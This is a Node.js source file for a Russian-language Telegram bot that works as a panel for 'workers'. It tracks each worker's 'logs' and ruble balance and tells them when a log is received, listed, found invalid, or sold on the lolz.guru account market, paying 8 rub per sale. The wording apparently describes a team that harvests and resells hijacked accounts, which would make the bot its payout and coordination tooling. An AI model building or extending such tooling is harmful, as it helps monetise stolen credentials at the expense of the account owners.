// my modules import

const { token } = require("./config");
const db = require("./database");
const cmdStart = require("./botCreatingTools/cmdWorking");
const axios = require("axios");

// modules import

const { Telegraf } = require("telegraf");

const fire = require("firebase/database");
const { ref, get, child, set, update } = require("firebase/database");

// bot work

const bot = new Telegraf(token);

bot.start(async(ctx) => {
    const keyboard = {
        keyboard: [[{text: "👨🏼‍💻Ваш профиль"}], [{text: "Информация"}, {text: "Топ воркеров"}, {text: "Создать бота"}]],
        resize_keyboard: true
    }

    const user_data = await get(child(ref(db), `users/${ctx.chat.id}`))
    const user = user_data.val();

    if(user != null) return await ctx.reply("Вы вернулись в панель!", {reply_markup: keyboard});
    const user_info = {
        logs: {
            logsAllTime: 0,
            logsMonth: 0,
            logsDay: 0
        },
        balance: 0,
        balanceAllTime: 0
    }

    await update(child(ref(db), `users/${ctx.chat.id}`), user_info);
    await ctx.reply("Добро пожаловать в нашу команду! Удачной работы!", {reply_markup: keyboard});
});

bot.hears("👨🏼‍💻Ваш профиль", async (ctx) => {
    const user_data = await get(child(ref(db), `users/${ctx.chat.id}`))
    const user = user_data.val();

    if(user == null) return await ctx.reply("Пропишите /start");

    const keyboard = {
        inline_keyboard: [[{text: "Вывести деньги", callback_data: "withdraw_money"}]]
    }

    const { balance, balanceAllTime } = user
    const { logsAllTime, logsMonth, logsDay } = user.logs;

    await ctx.reply(`Ваш профиль\n\nЛогов всего: ${logsAllTime}\nЛогов за месяц: ${logsMonth}\nЛогов за день: ${logsDay}\n\nБаланс: ${balance}₽\nВсего заработано: ${balanceAllTime}₽`, {reply_markup: keyboard})
});

function sleep(ms) {
    return new Promise((resolve) => {
        setTimeout(resolve, ms);
    });
}

const getUpdates = async () => {
    const updatesData = await axios.get("http://localhost:5000/getUpdates");
    const updates = updatesData.data;

    console.log("Search updates!")

    console.log(updates)

    for(let update of updates)
    {
        // newAccount
        if(update.type == "newAccount")
        {
            await bot.telegram.sendMessage(update.worker_id, `🎉 Вам пришёл лог #${update.id}! Лог выставляется на маркет, ожидайте.`);
        }

        if(update.type == "accCantSell") {
            await bot.telegram.sendMessage(update.worker_id, `❌ Лог #${update.id} не удалось продать, так как аккаунт стал невалид.`)
        }

        if(update.type == "accAddedOnSell") {
            await bot.telegram.sendMessage(update.worker_id, `✅ Лог #${update.id} был выставлен на продажу! Ожидайте пока его купят.`)
        }

        if(update.type == "accSelled") {
            const item_id = update.accLink.replace("https://lolz.guru/market/", "");
            const accsOnSellData = await get(child(ref(db), `accountsOnSell`));
            const accsOnSell = accsOnSellData.val();

            const data = accsOnSell[item_id]
            delete accsOnSell[item_id];

            await fire.update(child(ref(db), `accountsOnSell`), accsOnSell);

            await bot.telegram.sendMessage(data.worker_id, `🎉 Лог #${data.id} был продан! Вам было зачислено 8 rub!`)
        }
    }
}

const checkUpdates = new Promise(async (reslove, reject) => {
    while(true)
    {
        await getUpdates();
        await sleep(100);
    }
})

Promise.all([checkUpdates])

bot.launch();